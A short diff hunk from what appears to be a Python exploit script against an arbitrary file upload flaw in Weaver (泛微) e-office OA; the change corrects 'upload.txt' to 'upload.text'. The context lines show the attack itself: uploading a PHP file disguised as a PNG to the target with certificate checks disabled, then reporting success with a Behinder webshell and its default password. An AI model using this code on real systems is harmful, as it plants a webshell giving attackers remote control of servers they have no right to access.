@@ -31,7 +31,7 @@ def main(target_url):
         requests.packages.urllib3.disable_warnings()
         file = [('file1', ('index123.php', open('main/weaver/poc/bin/index123.php', 'rb'), 'image/png'))]
         upload = requests.post(upload_url, headers=headers, files=file, verify=False)
-        if upload.status_code == 200 and 'logo-eoffice.php' in upload.txt:
+        if upload.status_code == 200 and 'logo-eoffice.php' in upload.text:
             console.print(now_time() + ' [SUCCESS]  泛微OAUploadFile任意文件上传漏洞存在,冰蝎默认密码:{}'.format(exp_url), style='bold green')
         else:
             console.print(now_time() + ' [WARNING]  泛微OAUploadFile任意文件上传漏洞不存在', style='bold red ')
